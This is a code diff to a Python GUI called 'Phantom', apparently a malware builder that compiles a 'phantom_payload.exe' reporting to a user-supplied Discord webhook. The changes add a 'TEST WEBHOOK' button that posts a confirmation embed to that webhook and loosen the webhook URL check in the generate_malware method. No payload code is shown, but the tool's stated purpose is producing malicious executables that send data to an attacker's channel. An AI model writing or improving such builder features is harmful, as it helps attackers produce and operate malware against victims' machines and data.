@@ -122,7 +122,15 @@ class Phantom:
         config_panel.pack(fill=tk.BOTH, expand=True)
 
         # Webhook
-        self._create_input_section(config_panel, "Discord Webhook URL", "Paste your webhook here...", "url_entry")
+        webhook_frame = ttk.Frame(config_panel, style="Panel.TFrame")
+        webhook_frame.pack(fill=tk.X)
+        self._create_input_section(webhook_frame, "Discord Webhook URL", "Paste your webhook here...", "url_entry")
+        
+        self.test_webhook_btn = tk.Button(webhook_frame, text="TEST WEBHOOK", command=self.test_webhook,
+                                         bg=self.colors["bg"], fg=self.colors["accent"], font=("Segoe UI", 8, "bold"),
+                                         activebackground=self.colors["bg"], activeforeground="#0086cc",
+                                         bd=0, cursor="hand2", padx=10)
+        self.test_webhook_btn.pack(anchor=tk.E, pady=(0, 5))
         
         # EXE Name
         self._create_input_section(config_panel, "Output File Name", "payload.exe", "exe_entry", default="phantom_payload.exe")
@@ -448,6 +456,33 @@ class Phantom:
         if self.icon_path:
             self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")
 
+    def test_webhook(self):
+        url = self.url_entry.get().strip()
+        if not url:
+            messagebox.showwarning("Warning", "Please enter a Webhook URL first")
+            return
+        
+        if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
+            messagebox.showwarning("Warning", "Invalid Webhook URL format")
+            return
+
+        try:
+            payload = {
+                "embeds": [{
+                    "title": "✅ Phantom Connection Test",
+                    "description": "Your webhook is correctly configured and receiving messages!",
+                    "color": 0x00A2ED,
+                    "footer": {"text": "Phantom V2.1 PRO EDITION"}
+                }]
+            }
+            response = requests.post(url, json=payload, timeout=10)
+            if response.status_code in [200, 204]:
+                messagebox.showinfo("Success", "Test message sent successfully! Check your Discord channel.")
+            else:
+                messagebox.showerror("Error", f"Failed to send test message. Status code: {response.status_code}\nResponse: {response.text}")
+        except Exception as e:
+            messagebox.showerror("Error", f"Connection error: {str(e)}")
+
     def generate_malware(self):
         url = self.url_entry.get().strip()
         exe_name = self.exe_entry.get().strip()
@@ -456,9 +491,9 @@ class Phantom:
             messagebox.showwarning("Warning", "Please enter a Webhook URL")
             return
         
-        # Validate Webhook URL format
-        if not url.startswith("https://discord.com/api/webhooks/") and not url.startswith("https://discordapp.com/api/webhooks/"):
-            messagebox.showwarning("Warning", "Invalid Webhook URL. It should start with https://discord.com/api/webhooks/")
+        # Relaxed validation: just check if it contains the webhook part
+        if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
+            messagebox.showwarning("Warning", "Invalid Webhook URL. It should be a Discord webhook link.")
             return
 
         if not self.destination:
